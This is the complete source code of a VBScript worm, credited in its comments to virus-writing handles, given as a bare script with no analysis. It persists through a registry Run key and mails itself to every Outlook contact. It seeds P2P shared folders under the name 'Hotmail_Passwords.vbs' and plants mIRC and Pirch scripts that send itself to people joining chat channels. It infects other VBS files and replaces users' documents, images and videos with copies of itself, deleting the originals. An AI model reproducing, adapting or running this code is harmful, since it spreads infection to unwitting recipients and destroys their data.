   ' VBS/Wshwc.EMM by PetiK, 08/11/2009
   On Error Resume Next
   Set JYCIHPHSSORVPMNZ7 = CreateObject("Scripting.FileSystemObject")
   Set VEPLJDKDDNJCWNZR8 = CreateObject("WScript.Shell")
   Set AAXGVYBVXOYIFHHG9 = JYCIHPHSSORVPMNZ7.GetFile(WScript.ScriptFullName)
   AAXGVYBVXOYIFHHG9.Copy (JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\Attachment.vbs")
   Set ShowWorm = JYCIHPHSSORVPMNZ7.GetFile(JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\Attachment.vbs")
   ShowWorm.Attributes = 0
   AAXGVYBVXOYIFHHG9.Copy (JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\emm.dll.vbs")
   Set HideWorm = JYCIHPHSSORVPMNZ7.GetFile(JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\emm.dll.vbs")
   HideWorm.Attributes = 2
   VEPLJDKDDNJCWNZR8.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\emm", "Wscript.exe " & JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\emm.dll.vbs %1"
   Set KUUPOPWLDPXIUCEF1 = CreateObject("Outlook.Application")
   If Not KUUPOPWLDPXIUCEF1 = "" Then
   For Each WAHSQDZWNOOPAERX2 In KUUPOPWLDPXIUCEF1.GetNameSpace("MAPI").AddressLists
   For BWOMDYROIPEVKXZM3 = 1 To WAHSQDZWNOOPAERX2.AddressEntries.Count
   SXIKSGMQNPKIARTT5 = Chr(87) & Chr(83) & Chr(72) & Chr(87) & Chr(67)
   EDVNUUPBXOCPGTFK6 = VEPLJDKDDNJCWNZR8.RegRead("HKEY_CURRENT_USER\Software\" & SXIKSGMQNPKIARTT5 & "\EMM\" & WAHSQDZWNOOPAERX2.AddressEntries(BWOMDYROIPEVKXZM3))
   If EDVNUUPBXOCPGTFK6 <> SXIKSGMQNPKIARTT5 Then
   Set NCBPFLUYSOVCQYLD4 = KUUPOPWLDPXIUCEF1.CreateItem(0)
   NCBPFLUYSOVCQYLD4.Recipients.Add (WAHSQDZWNOOPAERX2.AddressEntries(BWOMDYROIPEVKXZM3))
   NCBPFLUYSOVCQYLD4.Subject = "Re: Look at this!"
   NCBPFLUYSOVCQYLD4.Body = "Hello, Look at the attachments!"
   NCBPFLUYSOVCQYLD4.Attachments.Add (JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\Attachment.vbs")
   NCBPFLUYSOVCQYLD4.DeleteAfterSubmit = True
   NCBPFLUYSOVCQYLD4.Importance = 1
   NCBPFLUYSOVCQYLD4.Send
   VEPLJDKDDNJCWNZR8.RegWrite "HKEY_CURRENT_USER\Software\" & SXIKSGMQNPKIARTT5 & "\EMM\" & WAHSQDZWNOOPAERX2.AddressEntries(BWOMDYROIPEVKXZM3), SXIKSGMQNPKIARTT5
   End If
   Next
   Next
   End If
   FVEBITTMSPNOPAOV10 = VEPLJDKDDNJCWNZR8.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   For SwitchFolders = 0 To 9
   FolderArray = Array("C:\Kazaa\My Shared Folder", _
   FVEBITTMSPNOPAOV10 & "\KaZaA Lite\My Shared Folder", _
   "C:\My Downloads", _
   FVEBITTMSPNOPAOV10 & "\Kazaa\My Shared Folder", _
   FVEBITTMSPNOPAOV10 & "\KaZaA Lite\My Shared Folder", _
   FVEBITTMSPNOPAOV10 & "\Bearshare\Shared", _
   FVEBITTMSPNOPAOV10 & "\Edonkey2000", _
   FVEBITTMSPNOPAOV10 & "\Morpheus\My Shared Folder", _
   FVEBITTMSPNOPAOV10 & "\Grokster\My Grokster", _
   FVEBITTMSPNOPAOV10 & "\ICQ\Shared Files")
   If JYCIHPHSSORVPMNZ7.FolderExists(FolderArray(SwitchFolders)) Then
   AAXGVYBVXOYIFHHG9.Copy (FolderArray(SwitchFolders) & "\Hotmail_Passwords.vbs")
   Set ShowP2PFile = JYCIHPHSSORVPMNZ7.GetFile(FolderArray(SwitchFolders) & "\Hotmail_Passwords.vbs")
   ShowP2PFile.Attributes = 0
   End If
   Next
   AAXGVYBVXOYIFHHG9.Copy (JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\CheckThis.vbs")
   Set ShowMircCopy = JYCIHPHSSORVPMNZ7.GetFile(JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\CheckThis.vbs")
   ShowMircCopy.Attributes = 0
   FVEBITTMSPNOPAOV10 = VEPLJDKDDNJCWNZR8.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If JYCIHPHSSORVPMNZ7.FileExists("C:\Mirc\Mirc.ini") Then
   mIRCPath = "C:\Mirc"
   Else
   If JYCIHPHSSORVPMNZ7.FileExists("C:\Mirc32\Mirc.ini") Then
   mIRCPath = "C:\Mirc32"
   Else
   If JYCIHPHSSORVPMNZ7.FileExists(FVEBITTMSPNOPAOV10 & "\Mirc\Mirc.ini") Then
   mIRCPath = FVEBITTMSPNOPAOV10 & "\Mirc"
   End If
   End If
   End If
   If Not mIRCPath = "" Then
   Set WriteMirc = JYCIHPHSSORVPMNZ7.CreateTextFile(mIRCPath & "\Script.ini", True)
   WriteMirc.WriteLine ("[script]")
   WriteMirc.WriteLine ("n5= on 1:JOIN:#:{")
   WriteMirc.WriteLine ("n6= /if ( $nick == $me ) { halt }")
   WriteMirc.WriteLine ("n7= /msg $nick Check out this file :)")
   WriteMirc.WriteLine ("n8= /dcc send -c $nick " & JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\CheckThis.vbs")
   WriteMirc.WriteLine ("n9= }")
   WriteMirc.Close
   Set HideScript = JYCIHPHSSORVPMNZ7.GetFile(mIRCPath & "\Script.ini")
   HideScript.Attributes = 2
   End If
   AAXGVYBVXOYIFHHG9.Copy (JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\Hehe.vbs")
   Set ShowPirchCopy = JYCIHPHSSORVPMNZ7.GetFile(JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\Hehe.vbs")
   ShowPirchCopy.Attributes = 0
   If JYCIHPHSSORVPMNZ7.FolderExists("C:\Pirch") Then
   PirchPath = "C:\Pirch"
   Else
   If JYCIHPHSSORVPMNZ7.FolderExists("C:\Pirch32") Then
   PirchPath = "C:\Pirch32"
   Else
   FVEBITTMSPNOPAOV10 = VEPLJDKDDNJCWNZR8.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If JYCIHPHSSORVPMNZ7.FolderExists(FVEBITTMSPNOPAOV10 & "\Pirch") Then
   PirchPath = FVEBITTMSPNOPAOV10 & "\Pirch"
   End If
   End If
   End If
   If Not PirchPath = "" Then
   Set WritePirch = JYCIHPHSSORVPMNZ7.CreateTextFile(Path & "\Events.ini", True)
   WritePirch.WriteLine ("[Levels]")
   WritePirch.WriteLine ("Enabled=1")
   WritePirch.WriteLine ("Count=6")
   WritePirch.WriteLine ("Level1=000-Unknowns")
   WritePirch.WriteLine ("000-UnknownsEnabled=1")
   WritePirch.WriteLine ("Level2=100-Level 100")
   WritePirch.WriteLine ("100-Level 100Enabled=1")
   WritePirch.WriteLine ("Level3=200-Level 200")
   WritePirch.WriteLine ("200-Level 200Enabled=1")
   WritePirch.WriteLine ("Level4=300-Level 300")
   WritePirch.WriteLine ("300-Level 300Enabled=1")
   WritePirch.WriteLine ("Level5=400-Level 400")
   WritePirch.WriteLine ("400-Level 400Enabled=1")
   WritePirch.WriteLine ("Level6=500-Level 500")
   WritePirch.WriteLine ("500-Level 500Enabled=1")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[000-Unknowns]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("Event1=ON JOIN:#:/msg $nick This is funny!")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[100-Level 100]")
   WritePirch.WriteLine ("User1=*!*@*")
   WritePirch.WriteLine ("UserCount=1")
   WritePirch.WriteLine ("Event1=ON JOIN:#:/dcc send $nick " & JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & "\Hehe.vbs")
   WritePirch.WriteLine ("EventCount=1")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[200-Level 200]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[300-Level 300]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[400-Level 400]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[500-Level 500]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.Close
   Set HideScript2 = JYCIHPHSSORVPMNZ7.GetFile(PirchPath & "\Events.ini")
   HideScript2.Attributes = 2
   End If
   Randomize
   If Int((20 * Rnd) + 1) = 1 Then
   MsgBox "Cannot display error", vbExclamation + vbSystemModal + vbOKOnly, "Error"
   End If
   E1()
   Sub E1()
   On Error Resume Next
   Set a = CreateObject("Scripting.FileSystemObject")
   For Each SeekNetCopyDrives In a.Drives
   If SeekNetCopyDrives.DriveType = 2 _
   Or SeekNetCopyDrives.DriveType = 3 Then
   E3 (SeekNetCopyDrives.Path & "\")
   End If
   Next
   End Sub
   Sub E2(FileTarget)
   On Error Resume Next
   Set otf = a.GetFile(WScript.ScriptFullName)
   ra = otf.ReadAll
   otf.Close
   Set a = CreateObject("Scripting.FileSystemObject")
   Set f = a.GetFolder(FileTarget)
   For Each n In f.Files
   FileExt = LCase(a.GetExtensionName(n.Path))
   If FileExt = "vbs" Or FileExt = "vbe" Then
   Set openvbs = a.OpenTextFile(n.Path, 1)
   vbsra = openvbs.ReadAll
   openvbs.Close
   If InStr(1, vbsra, "EMM") = False Then
   Set JYCIHPHSSORVPMNZ7 = CreateObject("Scripting.FileSystemObject")
   Set JC = JYCIHPHSSORVPMNZ7.OpenTextFile(WScript.ScriptFullName, 1)
   WormFileReadAllText = JC.ReadAll
   JC.Close
   Set WriteWormCode = JYCIHPHSSORVPMNZ7.OpenTextFile(n.Path, 8, True)
   WriteWormCode.WriteLine vbCrLf & "' EMM" & vbCrLf & "Tz = " & Chr(34) & Chr(34)
   For i = 1 To Len(WormFileReadAllText)
   Tz = Mid(WormFileReadAllText, i, 1)
   Tz = Hex(Asc(Tz))
   If Len(Tz) = 1 Then
   Tz = "0" & Tz
   End If
   Gz = Gz + Tz
   If Len(Gz) = 110 Then
   WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
   Gz = ""
   End If
   If Len(WormFileReadAllText) - i = 0 Then
   WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
   Gz = ""
   End If
   Next
   WriteWormCode.WriteLine "Set JYCIHPHSSORVPMNZ7 = CreateObject(""Scripting.FileSystemObject"")"
   WriteWormCode.WriteLine "Set VEPLJDKDDNJCWNZR8 = CreateObject(""WScript.Shell"")"
   WriteWormCode.WriteLine "Set WriteAppend = JYCIHPHSSORVPMNZ7.CreateTextFile(JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & ""\emm.dll.vbs"", True)"
   WriteWormCode.WriteLine "WriteAppend.Write CM(Tz)"
   WriteWormCode.WriteLine "WriteAppend.Close"
   WriteWormCode.WriteLine "VEPLJDKDDNJCWNZR8.RegWrite ""HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\emm"", ""Wscript.exe "" & JYCIHPHSSORVPMNZ7.GetSpecialFolder(1) & ""\emm.dll.vbs %1"""
   WriteWormCode.WriteLine "Function CM(CN)"
   WriteWormCode.WriteLine "For GC = 1 To Len(CN) Step 2"
   WriteWormCode.WriteLine "CM = CM & Chr(""&h"" & Mid(CN, GC, 2))"
   WriteWormCode.WriteLine "Next"
   WriteWormCode.WriteLine "End Function"
   WriteWormCode.Close
   End If
   End If
   If FileExt = "jpg" Or FileExt = "html" Or FileExt = "mpg" Or FileExt = "htm" Or FileExt = "doc" Or FileExt = "avi" Then
   JYCIHPHSSORVPMNZ7.CopyFile WScript.ScriptFullName, n.Path & ".vbs"
   JYCIHPHSSORVPMNZ7.DeleteFile (n.Path)
   End If
   Next
   End Sub
   Sub E3(FileTarget)
   On Error Resume Next
   Set a = CreateObject("Scripting.FileSystemObject")
   Set f = a.GetFolder(FileTarget)
   For Each n In f.SubFolders
   E2 (n.Path)
   E3 (n.Path)
   Next
   End Sub
   ' Wshwc 1.0 by Zed/[rRlf]
